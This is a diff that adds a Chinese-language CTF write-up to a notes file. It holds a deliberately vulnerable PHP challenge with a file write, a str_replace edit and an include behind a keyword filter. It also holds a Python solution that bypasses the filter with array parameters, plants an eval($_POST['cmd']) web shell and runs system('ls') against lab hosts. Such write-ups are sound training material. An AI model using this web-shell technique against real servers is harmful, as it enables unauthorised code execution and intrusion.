@@ -940,6 +940,84 @@ import base64
 print(base64.b64decode(res.content))
 ```
 
+
+# NSSCTF prize6
+https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF%202020%E5%AE%98%E6%96%B9WriteUp.md
+
+https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/
+
+https://lanvnal.com/2020/10/25/2020-gong-ye-hu-lian-wang-an-quan-xue-sheng-zu-chu-sai-wp/
+
+题目
+
+```php
+<?php
+
+function x(){
+    exit();
+}
+
+if(isset($_GET['f'])){
+    $content = $_GET['content'];
+    if (preg_match('/index|function|x|iconv|UCS|UTF|rot|zlib|quoted|base64|%|toupper|tolower|strip_tags|dechunk|\.\./i', $content)) {
+        die('hacker');
+    }
+    if ($_GET['f'] == "create"){
+        file_put_contents($content, '<?=x();?>' . $content);
+    }
+    elseif ($_GET['f'] == "edit"){
+        $s1 = $_GET['s1'];
+        $s2 = $_GET['s2'];
+        if (strlen($s1) > 20 || strlen($s2) > 20 || preg_match('/\=|x| |\?|\<|\>|\(|\)/i', $s1) || preg_match('/\=|x| |\?|\<|\>|\(|\)/i', $s2)) {
+            die('hacker');
+        }
+        if(file_exists($content)){
+            $s = file_get_contents($content);
+            $s = str_replace($s1, $s2, $s);
+            file_put_contents($content, $s);
+        }
+        else{
+            die("file no exits!");
+        }
+
+    }
+    else{
+        include($content);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+直接数组绕过
+```python
+import pprint
+from requests_html import HTMLSession
+
+url = 'http://192.168.61.141/1.php'
+# url = 'http://11726-288c65e8-2d63-4075.nss.ctfer.vip:9080/'
+params = {
+    'f': 'create',
+    'content': 'shell3.php',
+}
+params2 = {
+    'f': 'edit',
+    'content': 'shell3.php',
+    's1[]': "x();",
+    's2[]': "eval($_POST['cmd']);"
+}
+
+proxies = {}
+
+s = HTMLSession()
+s.get(url, params=params, proxies=proxies)
+s.get(url, params=params2, proxies=proxies)
+res = s.post('http://192.168.61.141/shell3.php', data={'cmd': "system('ls');"})
+pprint.pprint(res.text)
+```
+
+
 # SWPU新生赛 // 2021WLLMCTF新生赛
 
 
